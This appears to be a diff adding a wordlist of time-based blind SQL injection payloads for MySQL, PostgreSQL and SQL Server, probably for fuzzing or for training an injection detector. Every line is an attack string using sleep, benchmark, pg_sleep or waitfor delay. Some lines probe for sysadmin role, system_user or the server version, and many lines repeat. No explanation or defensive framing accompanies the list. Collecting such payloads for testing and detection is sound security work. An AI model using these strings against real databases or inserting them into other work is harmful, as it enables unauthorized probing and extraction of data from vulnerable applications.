@@ -1,0 +1,2000 @@
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+or sleep  (  __TIME__  )    =  '
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or sleep  (  __TIME__  )    =  '
+ )   or pg_sleep  (  __TIME__  )  --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )    or sleep  (  __TIME__  )    =  '
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or sleep  (  __TIME__  )    =  '
+1" where 7739  =  7739 and sleep  (  5  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or sleep  (  __TIME__  )  #
+or sleep  (  __TIME__  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+ )   or sleep  (  __TIME__  )    =  '
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+a' waitfor delay '0:0:10'--
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1 or pg_sleep  (  __TIME__  )  --
+or sleep  (  __TIME__  )  #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1  )   or sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )    =  "
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )    =  '
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1 or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'  )   rlike sleep  (  5  )  #
+1" where 7739  =  7739 and sleep  (  5  )  --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )    or pg_sleep  (  __TIME__  )  --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+,waitfor delay '0:0:__TIME__'--
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+pg_sleep  (  __TIME__  )  --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )   or pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )  ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ )   or sleep  (  __TIME__  )    =  '
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"   )    )    or sleep  (  __TIME__  )    =  "
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 or pg_sleep  (  __TIME__  )  --
+sleep  (  __TIME__  )  #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )    =  "
+1'  )   rlike sleep  (  5  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )    =  "
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1" where 7739  =  7739 and sleep  (  5  )  --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+1'  )   rlike sleep  (  5  )  #
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+ )   or pg_sleep  (  __TIME__  )  --
+1'  )   rlike sleep  (  5  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+"  )   or sleep  (  __TIME__  )    =  "
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )  #
+1'  )   rlike sleep  (  5  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+or sleep  (  __TIME__  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 or pg_sleep  (  __TIME__  )  --
+1  )   or sleep  (  __TIME__  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1" where 7739  =  7739 and sleep  (  5  )  --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or sleep  (  __TIME__  )  #
+or sleep  (  __TIME__  )    =  '
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1 waitfor delay '0:0:10'--
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+"   )    )    or sleep  (  __TIME__  )    =  "
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )    =  '
+1" where 7739  =  7739 and sleep  (  5  )  --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    or sleep  (  __TIME__  )  #
+1  )   or sleep  (  __TIME__  )  #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'  )   rlike sleep  (  5  )  #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+pg_sleep  (  __TIME__  )  --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1 or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+or sleep  (  __TIME__  )  #
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+";waitfor delay '0:0:__TIME__'--
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+"  )   or pg_sleep  (  __TIME__  )  --
+1 or pg_sleep  (  __TIME__  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+1 or pg_sleep  (  __TIME__  )  --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or pg_sleep  (  __TIME__  )  --
+ )    )    or sleep  (  __TIME__  )    =  '
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+1'  )   rlike sleep  (  5  )  #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1 or pg_sleep  (  __TIME__  )  --
+1 or pg_sleep  (  __TIME__  )  --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+pg_sleep  (  __TIME__  )  --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "cneo" like "cneo
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+ )    )    or pg_sleep  (  __TIME__  )  --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+or sleep  (  __TIME__  )  #
+ )    )    or pg_sleep  (  __TIME__  )  --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --
+or sleep  (  __TIME__  )    =  '
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or pg_sleep  (  __TIME__  )  --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+a' waitfor delay '0:0:10'--
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+1   )    )    or sleep  (  __TIME__  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+"   )    )    or pg_sleep  (  __TIME__  )  --
+sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or sleep  (  __TIME__  )  #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1 waitfor delay '0:0:10'--
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or pg_sleep  (  __TIME__  )  --
+1 or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+or sleep  (  __TIME__  )    =  '
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ )    )    or sleep  (  __TIME__  )    =  '
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+a' waitfor delay '0:0:10'--
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+sleep  (  __TIME__  )  #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 waitfor delay '0:0:10'--
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+or sleep  (  __TIME__  )  #
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   or sleep  (  __TIME__  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ )   or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
